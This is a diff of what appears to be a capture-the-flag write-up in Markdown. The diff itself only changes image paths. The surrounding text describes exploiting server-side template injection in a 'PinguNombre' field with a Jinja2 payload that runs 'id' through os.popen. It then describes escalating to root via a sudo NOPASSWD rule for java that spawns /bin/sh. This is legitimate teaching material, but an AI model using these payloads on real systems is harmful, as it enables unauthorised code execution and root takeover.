@@ -62,7 +62,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 11.85 seconds
 ```
 
-![](image.png)
+![](images/img.png)
 
 3. I tested template rendering in the `PinguNombre` field and validated injection by evaluating arithmetic server side.
 
@@ -70,7 +70,7 @@ Nmap done: 1 IP address (1 host up) scanned in 11.85 seconds
 {{7*7}}
 ```
 
-![](image-1.png)
+![](images/img-1.png)
 
 4. The application responded with `49`, which confirmed SSTI and established an execution primitive.
 
@@ -78,7 +78,7 @@ Nmap done: 1 IP address (1 host up) scanned in 11.85 seconds
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 
-![](image-2.png)
+![](images/img-2.png)
 
 ---
 
@@ -138,7 +138,7 @@ User pinguinazo may run the following commands on 1906c54ac29e:
     (ALL) NOPASSWD: /usr/bin/java
 ```
 
-![](image-3.png)
+![](images/img-3.png)
 
 2. I compiled a minimal Java launcher that spawns `/bin/sh`, then executed it with sudo to inherit root privileges.
 
